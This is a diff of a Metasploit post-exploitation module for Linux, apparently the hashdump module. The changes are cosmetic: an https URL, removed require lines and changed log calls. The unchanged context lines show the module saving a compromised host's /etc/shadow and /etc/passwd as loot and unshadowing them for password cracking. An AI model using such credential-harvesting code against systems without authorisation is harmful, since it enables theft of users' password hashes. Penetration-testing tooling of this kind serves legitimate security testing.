@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Linux::Priv
 
@@ -31,8 +27,8 @@ class MetasploitModule < Msf::Post
       # Save in loot the passwd and shadow file
       p1 = store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
       p2 = store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
-      vprint_status("Shadow saved in: #{p1.to_s}")
-      vprint_status("passwd saved in: #{p2.to_s}")
+      vprint_good("Shadow saved in: #{p1.to_s}")
+      vprint_good("passwd saved in: #{p2.to_s}")
 
       # Unshadow the files
       john_file = unshadow(passwd_file, shadow_file)
@@ -76,5 +72,4 @@ class MetasploitModule < Msf::Post
 
     unshadowed
   end
-
 end
